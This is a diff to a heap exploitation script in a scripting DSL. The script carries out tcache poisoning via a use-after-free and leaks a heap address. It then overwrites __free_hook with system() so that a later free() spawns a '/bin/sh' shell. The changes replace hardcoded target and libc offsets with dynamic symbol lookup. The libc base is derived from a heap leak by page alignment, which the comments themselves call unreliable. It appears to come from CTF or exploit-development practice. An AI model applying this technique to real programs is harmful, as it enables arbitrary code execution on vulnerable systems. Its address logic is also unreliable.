@@ -49,8 +49,9 @@ print("    Heap leak:", hex(heap_leak))
 # Step 4: Tcache poisoning - overwrite fd pointer
 print("[+] Step 4: Poisoning tcache fd pointer...")
 
-# Target to overwrite (e.g., __free_hook or __malloc_hook)
-let target_addr = 0x404040  # Replace with actual target
+# Analyze binary to get dynamic target address
+let elf = analyze(binary)
+let target_addr = elf["symbols"]["target"]  # Or use GOT/PLT entry dynamically
 
 # Allocate chunk, free it, then use UAF to poison fd
 alloc(0x80, "VICTIM")
@@ -73,9 +74,14 @@ alloc(0x80, "/bin/sh\x00")  # Second alloc returns target_addr
 # If we wrote to __free_hook, next free() will call our address
 print("[+] Step 6: Triggering exploit...")
 
-# Overwrite __free_hook with system() address
-let libc_base = heap_leak - 0x1000  # Adjust based on leak
-let system = libc_base + 0x50d60
+# Calculate libc addresses dynamically
+# Assume heap_leak contains a libc pointer (adjust based on actual leak type)
+let libc_template = Libc("ubuntu20.04")
+# Note: In real exploit, determine what function was leaked from heap
+# For demo purposes, showing dynamic calculation pattern
+let libc_base = heap_leak & 0xfffffffffffff000  # Align to page
+let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+let system = libc_resolved["symbols"]["system"]
 let payload = p64(system)
 
 send(conn, "4")
